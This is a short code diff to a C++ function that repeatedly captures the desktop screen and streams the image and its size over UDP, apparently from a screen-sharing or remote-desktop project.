@@ -36,16 +36,20 @@ VOID SendDesktopScreen()
 	static UDPClient udpclient;
 	static BOOL init = FALSE;
 
-	if (!init)
-		init = udpclient.init();
+	if (!init && udpclient.init() && dxp.init())
+		init = TRUE;
+	
 	while (TRUE)
 	{
-		LPBYTE shot = CaptureScreen(&dxp);
+		auto pair = CaptureScreen(&dxp);
 
-		udpclient.send(std::string(reinterpret_cast<char*>(shot)));
+		std::cout << pair.second;
 
-		if(shot)
-			delete[] shot;
+		udpclient.send(std::to_string(pair.second));
+		udpclient.send(std::string(reinterpret_cast<char*>(pair.first)));
+
+		if(pair.first)
+			delete[] pair.first;
 	}
 }
 
